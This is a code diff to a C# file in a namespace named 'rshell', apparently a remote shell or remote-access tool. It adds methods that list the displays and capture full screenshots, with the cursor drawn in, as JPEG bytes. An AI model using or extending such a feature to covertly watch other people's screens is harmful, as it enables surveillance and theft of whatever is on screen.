@@ -12,6 +12,9 @@ using System.Security.Principal;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
+using System.Windows.Forms;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace rshell 
 { 
@@ -489,6 +492,50 @@ class Utils
 
         ERROR:
             throw new Win32Exception();
+        }
+        public static string[] GetCaptureDevices()
+        {
+            List<string> names = new List<string>();
+            foreach (Screen screen in Screen.AllScreens)
+            {
+                names.Add(screen.DeviceName);
+            }
+            return names.ToArray();
+        }
+
+        public static byte[] GetCaptureFrame(int screenIndex = 0, int divideScale = 1)
+        {
+            byte[] bytes = null;
+
+            try
+            {
+                Screen screen = Screen.AllScreens[screenIndex];
+                Rectangle rect = screen.Bounds;
+                Bitmap bmp = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb);
+                Graphics g = Graphics.FromImage(bmp);
+                g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
+                g.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
+
+                //draw cursor
+                int cX = Cursor.Position.X - screen.Bounds.Left;
+                int cY = Cursor.Position.Y - screen.Bounds.Top;
+                Cursors.Arrow.Draw(g, new Rectangle(new Point(cX - 3, cY - 3), new Size(6, 6)));
+
+
+                if (divideScale > 1)
+                {
+                    bmp = new Bitmap(bmp, new Size(bmp.Width / divideScale, bmp.Height / divideScale));
+                }
+
+                MemoryStream ms = new MemoryStream();
+                bmp.Save(ms, ImageFormat.Jpeg);
+                bytes = ms.ToArray();
+            }
+            catch (Exception)
+            {
+
+            }
+            return bytes;
         }
     }
 }
